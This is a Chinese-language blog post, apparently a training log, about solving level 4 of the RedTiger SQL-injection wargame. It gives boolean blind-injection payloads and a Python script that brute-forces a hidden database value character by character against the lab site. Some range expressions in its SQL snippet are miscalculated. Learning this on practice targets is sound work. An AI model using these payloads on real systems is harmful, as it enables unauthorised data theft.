---
title: red tiger 打靶日志
slug: redtiger-lab-training-note-2022-05-06
date: 2022-05-06 15:32:08
categories:
- security
tags:
- security
- redtiger
- sqli
---

## 前言

虽然靶场说不要透露任何 solution 但谷歌搜了下发现早有人透题了...于是灵活一点，不透 flag 就完了。

## 正文

### 盲注测试

看到`id=1`先试试`id=2`，发现返回 0，然后试试`id=2 or 1=1`，返回1，应该能注入。

### 长度测试

本来想 `or` 跟一个子查询：`SELECT (SELECT CHAR_LENGTH(keyword) FROM level4_secret LIMIT 1)>10;`，手欠试了下直接`or char_length(keyword)>10` 发现返回了 1 row，于是省掉了子查询。

用 `or char_length(keyword)>?`二分法，从`>100`开始测直到得到结果。

<!-- 结果是 21 -->

### 按位猜解

用 `or ascii(substring(keyword,1,1)) BETWEEN ascii('a') AND ascii('z')`测一遍第一个字符是不是小写字母，然后按这个思路二分搜一遍。

```sql
BETWEEN ascii('a') AND ascii('z')
BETWEEN ascii('a') AND ascii('a')-ascii('z') # 字母表前一半, 97~122
BETWEEN ascii('a')-ascii('z') and ascii('z') # 字母表后一半
BETWEEN ascii('A') AND ascii('Z')
BETWEEN ascii('0') AND ascii('9')
```

但如果不是字母或数字，是 UNICODE 的话就麻烦了。可以结合 `hex` 函数或者别的方式编码一下再猜，我没找到能把 UNICODE 转数字就像 `ascii` 一样的函数。

手工测肯定是不行的，没那个闲工夫。写个脚本暴力跑一遍即可。

```python
import time
import requests
import string

length = 0 # 自己根据上面的方法找出 keyword 长度
secret = ''

for pos in range(1, length):
    for c in string.printable:
        time.sleep(0.1)
        print(f'{pos}: test {c}')
        resp = requests.get('http://redtiger.labs.overthewire.org/level4.php', {
            'id': f'2 or substring(keyword,{pos},1)=\'{c}\''
        }, cookies={
            # **removed**
        })
        if resp.text.find('Query returned 1 rows.') >= 0:
            print(f'{pos}: {repr(c)} correct')
            secret += c
            break

print(f'secret is {secret}')
```

注意 cookies，其他没有特别的地方。这个脚本略暴力，可以优化成 `find_in_set` 二分搜索，可以显著降低请求次数。

## 总结

把 flag 贴进去就过了，没什么难的。原本想 sqlmap 能不能解决，但 sqlmap 还用不太熟练，不确定能不能盲注解出 keyword 的值。之后会在 DVWA 上研究下 sqlmap 猜解指定的字段要怎么猜。

